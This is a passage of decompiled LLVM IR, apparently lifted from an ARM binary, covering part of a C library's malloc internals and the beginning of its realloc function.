  br i1 %v7_16150, label %dec_label_pc_161d4, label %dec_label_pc_16158

dec_label_pc_16158:                               ; preds = %dec_label_pc_16150
  %v1_16158 = load i32, i32* @r5, align 4
  %v2_16158 = add i32 %v1_16158, %v0_16150
  %v0_1615c = load i32, i32* @r7, align 4
  %v2_1615c = sub i32 %v2_16158, %v0_1615c
  %v1_16160 = or i32 %v2_1615c, 1
  %v2_16164 = add i32 %v0_1615c, 4
  %v3_16164 = inttoptr i32 %v2_16164 to i32*
  store i32 %v1_16160, i32* %v3_16164, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_16170 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_16170, i32* @r6, align 4
  %v1_16174 = add i32 %v4_16170, 872
  %v2_16174 = inttoptr i32 %v1_16174 to i32*
  %v3_16174 = load i32, i32* %v2_16174, align 4
  %v0_16178 = load i32, i32* @r8, align 4
  %v2_16178 = icmp eq i32 %v0_16178, 0
  %v0_1617c = load i32, i32* @r5, align 4
  %v2_1617c = add i32 %v0_1617c, %v3_16174
  store i32 %v2_1617c, i32* %r3.global-to-local, align 4
  store i32 %v2_1617c, i32* %v2_16174, align 4
  %v0_16184 = load i32, i32* @r7, align 4
  %v1_16184 = load i32, i32* @r6, align 4
  %v2_16184 = add i32 %v1_16184, 44
  %v3_16184 = inttoptr i32 %v2_16184 to i32*
  store i32 %v0_16184, i32* %v3_16184, align 4
  br i1 %v2_16178, label %dec_label_pc_161d4, label %dec_label_pc_1618c

dec_label_pc_1618c:                               ; preds = %dec_label_pc_16158
  %v0_16190 = load i32, i32* @r8, align 4
  %v1_16190 = add i32 %v0_16190, -12
  %v1_16194 = and i32 %v1_16190, -8
  store i32 %v3_15f5c, i32* %ip.global-to-local, align 4
  %v2_1619c = add i32 %v1_16194, %v3_15f5c
  store i32 %v2_1619c, i32* %r1.global-to-local, align 4
  %v2_161a0 = icmp ugt i32 %v1_16194, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_161a8 = or i32 %v1_16194, 1
  store i32 %v1_161a8, i32* %r3.global-to-local, align 4
  store i32 %v1_161a8, i32* %v2_15f68, align 4
  %v0_161b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_161b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_161b0 = add i32 %v1_161b0, 8
  %v3_161b0 = inttoptr i32 %v2_161b0 to i32*
  store i32 %v0_161b0, i32* %v3_161b0, align 4
  %v0_161b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_161b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_161b4 = add i32 %v1_161b4, 4
  %v3_161b4 = inttoptr i32 %v2_161b4 to i32*
  store i32 %v0_161b4, i32* %v3_161b4, align 4
  br i1 %v2_161a0, label %dec_label_pc_161bc, label %dec_label_pc_161d4

dec_label_pc_161bc:                               ; preds = %dec_label_pc_1618c
  %v0_161bc = load i32, i32* @r6, align 4
  %v1_161bc = add i32 %v0_161bc, 836
  %v2_161bc = inttoptr i32 %v1_161bc to i32*
  %v3_161bc = load i32, i32* %v2_161bc, align 4
  store i32 %v3_161bc, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_161c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_161c4 = add i32 %v0_161c4, 8
  store i32 %v1_161c4, i32* @r0, align 4
  store i32 -1, i32* %v2_161bc, align 4
  %v0_161cc = call i32 @free()
  store i32 %v0_161cc, i32* %r0.global-to-local, align 4
  %v0_161d0 = load i32, i32* @r4, align 4
  %v1_161d0 = load i32, i32* @r6, align 4
  %v2_161d0 = add i32 %v1_161d0, 836
  %v3_161d0 = inttoptr i32 %v2_161d0 to i32*
  store i32 %v0_161d0, i32* %v3_161d0, align 4
  br label %dec_label_pc_161d4

dec_label_pc_161d4:                               ; preds = %.thread34, %dec_label_pc_1618c, %dec_label_pc_16158, %dec_label_pc_16150, %dec_label_pc_161bc
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r0.global-to-local, align 4
  %v4_161dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_161dc, i32* %lr.global-to-local, align 4
  %v1_161e0 = add i32 %v4_161dc, 872
  store i32 %v1_161e0, i32* %r1.global-to-local, align 4
  %v1_161e4 = inttoptr i32 %v1_161e0 to i32*
  %v2_161e4 = load i32, i32* %v1_161e4, align 4
  store i32 %v2_161e4, i32* %r1.global-to-local, align 4
  %v3_161e4 = add i32 %v4_161dc, 876
  %v4_161e4 = inttoptr i32 %v3_161e4 to i32*
  %v5_161e4 = load i32, i32* %v4_161e4, align 4
  store i32 %v5_161e4, i32* %r3.global-to-local, align 4
  %v1_161ec = add i32 %v4_161dc, 868
  %v2_161ec = inttoptr i32 %v1_161ec to i32*
  %v3_161ec = load i32, i32* %v2_161ec, align 4
  store i32 %v3_161ec, i32* %r3.global-to-local, align 4
  %v1_161f0 = add i32 %v4_161dc, 884
  %v2_161f0 = inttoptr i32 %v1_161f0 to i32*
  %v3_161f0 = load i32, i32* %v2_161f0, align 4
  store i32 %v3_161f0, i32* %r2.global-to-local, align 4
  %v2_161f4 = add i32 %v3_161ec, %v2_161e4
  store i32 %v2_161f4, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_161e4, %v5_161e4
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_161d4
  store i32 %v2_161e4, i32* %v4_161e4, align 4
  %v0_161fc.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_161fc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_161d4, %bb165
  %v1_161fc = phi i32 [ %v3_161f0, %dec_label_pc_161d4 ], [ %v1_161fc.pre, %bb165 ]
  %v4_16200 = phi i32 [ %v2_161f4, %dec_label_pc_161d4 ], [ %v0_161fc.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_16200, %v1_161fc
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_16200 = load i32, i32* %lr.global-to-local, align 4
  %v6_16200 = add i32 %v5_16200, 884
  %v7_16200 = inttoptr i32 %v6_16200 to i32*
  store i32 %v4_16200, i32* %v7_16200, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_16204 = load i32, i32* %lr.global-to-local, align 4
  %v1_16204 = add i32 %v0_16204, 44
  %v2_16204 = inttoptr i32 %v1_16204 to i32*
  %v3_16204 = load i32, i32* %v2_16204, align 4
  store i32 %v3_16204, i32* %ip.global-to-local, align 4
  %v1_16208 = add i32 %v3_16204, 4
  %v2_16208 = inttoptr i32 %v1_16208 to i32*
  %v3_16208 = load i32, i32* %v2_16208, align 4
  store i32 %v1_15e1c, i32* %r1.global-to-local, align 4
  %v1_16210 = and i32 %v3_16208, -4
  store i32 %v1_16210, i32* %r3.global-to-local, align 4
  %v3_16214 = icmp ult i32 %v1_16210, %v1_15e1c
  br i1 %v3_16214, label %dec_label_pc_16240, label %dec_label_pc_1621c

dec_label_pc_1621c:                               ; preds = %bb168
  %v0_1621c = load i32, i32* @sl, align 4
  %v2_1621c = sub i32 %v1_16210, %v0_1621c
  %v2_16220 = add i32 %v0_1621c, %v3_16204
  store i32 %v2_16220, i32* %r1.global-to-local, align 4
  %v1_16224 = or i32 %v2_1621c, 1
  store i32 %v1_16224, i32* %r3.global-to-local, align 4
  %v1_16228 = or i32 %v0_1621c, 1
  store i32 %v1_16228, i32* %r2.global-to-local, align 4
  %v1_1622c = add i32 %v3_16204, 8
  store i32 %v1_1622c, i32* %r0.global-to-local, align 4
  store i32 %v1_16228, i32* %v2_16208, align 4
  %v0_16234 = load i32, i32* %r1.global-to-local, align 4
  %v1_16234 = load i32, i32* %lr.global-to-local, align 4
  %v2_16234 = add i32 %v1_16234, 44
  %v3_16234 = inttoptr i32 %v2_16234 to i32*
  store i32 %v0_16234, i32* %v3_16234, align 4
  %v0_16238 = load i32, i32* %r3.global-to-local, align 4
  %v1_16238 = load i32, i32* %r1.global-to-local, align 4
  %v2_16238 = add i32 %v1_16238, 4
  %v3_16238 = inttoptr i32 %v2_16238 to i32*
  store i32 %v0_16238, i32* %v3_16238, align 4
  br label %dec_label_pc_16250

dec_label_pc_16240:                               ; preds = %bb157, %bb168, %dec_label_pc_1601c
  %v0_16240 = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16248 = inttoptr i32 %v0_16240 to i32*
  store i32 12, i32* %v2_16248, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16250

dec_label_pc_16250:                               ; preds = %bb151, %bb150, %dec_label_pc_1621c, %dec_label_pc_15e64, %dec_label_pc_16240
  %v0_16250 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16250, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16254

dec_label_pc_16254:                               ; preds = %.thread1, %dec_label_pc_15e30, %.thread121, %dec_label_pc_15ca0, %dec_label_pc_15c94, %dec_label_pc_15afc, %dec_label_pc_15a80, %dec_label_pc_16250
  store i32 %v2_159a8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  %v4_16264 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 24) to i32*), align 4
  store i32 %v4_16264, i32* @ip, align 4
  store i32 90736, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_16264)
  br label %dec_label_pc_16270

dec_label_pc_16270:                               ; preds = %dec_label_pc_159e0, %dec_label_pc_16254
  %v0_16270 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16270, i32* %r0.global-to-local, align 4
  store i32 %v3_1597c, i32* @r4, align 4
  store i32 %v6_1597c, i32* @r5, align 4
  store i32 %v9_1597c, i32* @r6, align 4
  store i32 %v12_1597c, i32* @r7, align 4
  store i32 %v15_1597c, i32* @r8, align 4
  store i32 %v18_1597c, i32* @sb, align 4
  store i32 %v21_1597c, i32* @sl, align 4
  store i32 %v24_1597c, i32* @fp, align 4
  store i32 %v27_1597c, i32* @lr, align 4
  ret i32 %v0_16270

; uselistorder directives
  uselistorder i32 %v0_1621c, { 1, 0, 2 }
  uselistorder i32 %v3_16204, { 1, 0, 2, 3 }
  uselistorder i32 %v4_16200, { 1, 0 }
  uselistorder i32 %v2_161e4, { 2, 0, 1, 3 }
  uselistorder i32 %v4_161dc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_16194, { 1, 2, 0 }
  uselistorder i32 %v0_1615c, { 1, 0 }
  uselistorder i32 %v0_16150, { 1, 0 }
  uselistorder i32 %v2_16140, { 1, 0 }
  uselistorder i32 %v2_160d0, { 2, 1, 0 }
  uselistorder i32 %v2_160b8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_160b0, { 1, 0, 2 }
  uselistorder i32 %v1_160ac, { 2, 1, 0 }
  uselistorder i32 %v0_160ac, { 3, 1, 2, 0 }
  uselistorder i32 %v1_16090, { 1, 0 }
  uselistorder i32 %v2_16068, { 1, 0 }
  uselistorder i32 %v3_1605c, { 1, 0, 2 }
  uselistorder i32 %v2_1603c, { 1, 0, 2 }
  uselistorder i32* %v2_16034, { 1, 0, 2 }
  uselistorder i32 %v0_1601c, { 1, 0 }
  uselistorder i32 %v6_15ff8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_15fe4, { 2, 1, 0 }
  uselistorder i32 %v0_15fcc, { 1, 0 }
  uselistorder i32 %v2_15f88, { 1, 0, 2, 3 }
  uselistorder i32 %v1_15f84, { 1, 0 }
  uselistorder i32 %v3_15f5c, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_15f3c, { 1, 0, 2 }
  uselistorder i32 %v2_15f24, { 1, 2, 0, 3 }
  uselistorder i32 %v1_15ecc, { 2, 1, 0 }
  uselistorder i32 %v6_15ec0, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_15e9c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_15e5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15e1c, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_15e14, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15e10, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_15dfc, { 1, 0 }
  uselistorder i32 %v7_15dbc, { 1, 0 }
  uselistorder i32 %v4_15dbc, { 1, 0 }
  uselistorder i32 %v0_15d8c, { 1, 0 }
  uselistorder i32 %v2_15d60, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_15d5c54, { 1, 0 }
  uselistorder i32 %v1_15d28, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_15d10., { 1, 2, 0 }
  uselistorder i32 %v0_15d18, { 0, 1, 3, 2 }
  uselistorder i32 %v1_15d18, { 1, 0 }
  uselistorder i32 %v3_15cf8, { 1, 0 }
  uselistorder i32 %v4_15cf4, { 1, 0, 2 }
  uselistorder i32 %v1_15c64, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15cbc, { 1, 0 }
  uselistorder i32 %v1_15ca0, { 1, 0 }
  uselistorder i32 %v1_15b40, { 1, 0 }
  uselistorder i32 %v0_15c80, { 2, 0, 1, 3 }
  uselistorder i32 %v3_15c48, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15cdc.pre, { 1, 2, 0 }
  uselistorder i32 %v0_15c24, { 2, 1, 0 }
  uselistorder i32 %v3_15c18, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_15b38, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_15be0, { 1, 0 }
  uselistorder i32 %v3_15bd4, { 1, 0 }
  uselistorder i32 %v0_15be0, { 1, 0 }
  uselistorder i32 %v3_15bb8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_15ba8, { 1, 0, 2 }
  uselistorder i32 %v3_15b60, { 2, 1, 0 }
  uselistorder i32 %v0_15b50, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15b20, { 1, 0 }
  uselistorder i32 %v1_15ad4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15ad0, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_15a74, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_15a68, { 1, 0 }
  uselistorder i32 %v3_15a38, { 1, 0 }
  uselistorder i32 %v0_15a2c, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_15a0c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_15a00, { 1, 0 }
  uselistorder i32 %v0_159d8, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 1, 2, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 0, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 36, 35, 28, 25, 0, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_16270, { 1, 0 }
  uselistorder label %dec_label_pc_16254, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_16250, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16240, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_161d4, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_16150, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16148, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1601c, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_15f50, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_15e08, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_15d5c, { 1, 0 }
  uselistorder label %dec_label_pc_15d64.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15d28, { 1, 0 }
  uselistorder label %dec_label_pc_15cdc, { 1, 0 }
  uselistorder label %dec_label_pc_15c70, { 1, 0 }
  uselistorder label %dec_label_pc_15c6c, { 1, 0 }
  uselistorder label %dec_label_pc_15c18, { 1, 0 }
  uselistorder label %dec_label_pc_15c04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15bcc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15bb8, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_16284(i32 %arg1) local_unnamed_addr {
dec_label_pc_16284:
  %v0_16284 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16284, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16284
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16284, %bb
  %v10_16298 = phi i32 [ %arg1, %dec_label_pc_16284 ], [ 0, %bb ]
  ret i32 %v10_16298

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1629c = load i32, i32* @r4, align 4
  %v6_1629c = load i32, i32* @r5, align 4
  %v9_1629c = load i32, i32* @r6, align 4
  %v12_1629c = load i32, i32* @r7, align 4
  %v15_1629c = load i32, i32* @r8, align 4
  %v18_1629c = load i32, i32* @sb, align 4
  %v21_1629c = load i32, i32* @sl, align 4
  %v24_1629c = load i32, i32* @fp, align 4
  %v27_1629c = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_162a8 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_162a8, label %dec_label_pc_162bc, label %dec_label_pc_162cc

dec_label_pc_162bc:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_162c0 = call i32 @malloc(i32 %arg2)
  store i32 %v1_162c0, i32* %r0.global-to-local, align 4
  store i32 %v1_162c0, i32* @r4, align 4
  br label %dec_label_pc_16624

dec_label_pc_162cc:                               ; preds = %entry
  %v2_162cc = icmp eq i32 %arg2, 0
  br i1 %v2_162cc, label %dec_label_pc_162d4, label %dec_label_pc_162e0

dec_label_pc_162d4:                               ; preds = %dec_label_pc_162cc
  %v0_162d4 = call i32 @free()
  store i32 %v0_162d4, i32* %r0.global-to-local, align 4
  %v0_162d8 = load i32, i32* @r6, align 4
  store i32 %v0_162d8, i32* @r4, align 4
  br label %dec_label_pc_16624

dec_label_pc_162e0:                               ; preds = %dec_label_pc_162cc
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_162e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 72) to i32*), align 4
  store i32 %v4_162e8, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_162e8, i32* %r2.global-to-local, align 4
  %v4_162f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 36) to i32*), align 4
  store i32 %v4_162f4, i32* %r1.global-to-local, align 4
  %v2_162f8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_162f8, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_16300 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16300)
  %v0_1630c = load i32, i32* @r4, align 4
  store i32 %v0_1630c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r1.global-to-local, align 4
  %v4_16318 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 16) to i32*), align 4
  store i32 %v4_16318, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_16324.962 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16318)
  %v0_16324 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_16324, -32
  br i1 %tmp36, label %dec_label_pc_16340, label %dec_label_pc_1632c

dec_label_pc_1632c:                               ; preds = %dec_label_pc_162e0
  %v0_1632c = call i32 @__GI___errno_location()
  store i32 %v0_1632c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16338 = inttoptr i32 %v0_1632c to i32*
  store i32 12, i32* %v2_16338, align 4
  br label %dec_label_pc_16624

dec_label_pc_16340:                               ; preds = %dec_label_pc_162e0
  %v1_16340 = add i32 %v0_16324, 11
  store i32 %v1_16340, i32* %r0.global-to-local, align 4
  %v0_16344 = load i32, i32* @r5, align 4
  %v1_16344 = add i32 %v0_16344, -4
  %v2_16344 = inttoptr i32 %v1_16344 to i32*
  %v3_16344 = load i32, i32* %v2_16344, align 4
  store i32 %v3_16344, i32* %r2.global-to-local, align 4
  %v2_16348 = icmp ugt i32 %v1_16340, 14
  %v7_16348 = icmp eq i32 %v1_16340, 15
  %v2_1634c = xor i1 %v2_16348, true
  %v3_1634c = or i1 %v7_16348, %v2_1634c
  br i1 %v3_1634c, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_16340
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_16340, %bb
  %v2_16350 = xor i1 %v7_16348, true
  %v3_16350 = and i1 %v2_16348, %v2_16350
  br i1 %v3_16350, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_16350 = and i32 %v1_16340, -8
  store i32 %v5_16350, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_16354 = and i32 %v3_16344, 2
  %v2_16354 = icmp eq i32 %v1_16354, 0
  %v1_16358 = add i32 %v0_16344, -8
  store i32 %v1_16358, i32* @sl, align 4
  %v1_1635c = and i32 %v3_16344, -4
  store i32 %v1_1635c, i32* @r6, align 4
  br i1 %v2_16354, label %dec_label_pc_16364, label %dec_label_pc_1653c

dec_label_pc_16364:                               ; preds = %bb29
  %v1_16364 = load i32, i32* @sb, align 4
  %v3_16364 = icmp ult i32 %v1_1635c, %v1_16364
  br i1 %v3_16364, label %dec_label_pc_16370, label %bb30

bb30:                                             ; preds = %dec_label_pc_16364
  store i32 %v1_1635c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_164d4

dec_label_pc_16370:                               ; preds = %dec_label_pc_16364
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_16378 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 32) to i32*), align 4
  store i32 %v4_16378, i32* %r0.global-to-local, align 4
  %v1_1637c = add i32 %v4_16378, 44
  %v2_1637c = inttoptr i32 %v1_1637c to i32*
  %v3_1637c = load i32, i32* %v2_1637c, align 4
  store i32 %v3_1637c, i32* %r3.global-to-local, align 4
  %v2_16380 = add i32 %v1_1635c, %v1_16358
  store i32 %v2_16380, i32* @r4, align 4
  %v9_16384 = icmp eq i32 %v2_16380, %v3_1637c
  %v1_16388 = add i32 %v2_16380, 4
  %v2_16388 = inttoptr i32 %v1_16388 to i32*
  %v3_16388 = load i32, i32* %v2_16388, align 4
  store i32 %v3_16388, i32* %r1.global-to-local, align 4
  br i1 %v9_16384, label %dec_label_pc_16390, label %dec_label_pc_163cc

dec_label_pc_16390:                               ; preds = %dec_label_pc_16370
  %v1_16390 = and i32 %v3_16388, -4
  %v2_16394 = add i32 %v1_16390, %v1_1635c
  store i32 %v2_16394, i32* %r1.global-to-local, align 4
  %v1_16398 = add i32 %v1_16364, 16
  store i32 %v1_16398, i32* %r3.global-to-local, align 4
  %v3_1639c = icmp ult i32 %v2_16394, %v1_16398
  br i1 %v3_1639c, label %dec_label_pc_16420, label %dec_label_pc_163a4

dec_label_pc_163a4:                               ; preds = %dec_label_pc_16390
  %v2_163a4 = sub i32 %v2_16394, %v1_16364
  %v1_163a8 = urem i32 %v3_16344, 2
  %v2_163ac = add i32 %v1_16364, %v1_16358
  store i32 %v2_163ac, i32* %r1.global-to-local, align 4
  %v2_163b0 = or i32 %v1_16364, %v1_163a8
  store i32 %v2_163b0, i32* %r2.global-to-local, align 4
  %v1_163b4 = or i32 %v2_163a4, 1
  store i32 %v1_163b4, i32* %r3.global-to-local, align 4
  store i32 %v0_16344, i32* @r4, align 4
  store i32 %v2_163b0, i32* %v2_16344, align 4
  %v0_163c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_163c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_163c0 = add i32 %v1_163c0, 44
  %v3_163c0 = inttoptr i32 %v2_163c0 to i32*
  store i32 %v0_163c0, i32* %v3_163c0, align 4
  %v0_163c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_163c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_163c4 = add i32 %v1_163c4, 4
  %v3_163c4 = inttoptr i32 %v2_163c4 to i32*
  store i32 %v0_163c4, i32* %v3_163c4, align 4
  br label %dec_label_pc_16608

dec_label_pc_163cc:                               ; preds = %dec_label_pc_16370
  %v1_163cc = and i32 %v3_16388, -2
  %v2_163d0 = add i32 %v1_163cc, %v2_16380
  store i32 %v2_163d0, i32* %r3.global-to-local, align 4
  %v1_163d4 = add i32 %v2_163d0, 4
  %v2_163d4 = inttoptr i32 %v1_163d4 to i32*
  %v3_163d4 = load i32, i32* %v2_163d4, align 4
  store i32 %v3_163d4, i32* %r3.global-to-local, align 4
  %v1_163d8 = urem i32 %v3_163d4, 2
  %v2_163d8 = icmp eq i32 %v1_163d8, 0
  br i1 %v2_163d8, label %dec_label_pc_163e0, label %dec_label_pc_16420

dec_label_pc_163e0:                               ; preds = %dec_label_pc_163cc
  %v1_163e0 = and i32 %v3_16388, -4
  store i32 %v1_163e0, i32* %r3.global-to-local, align 4
  %v2_163e4 = add i32 %v1_163e0, %v1_1635c
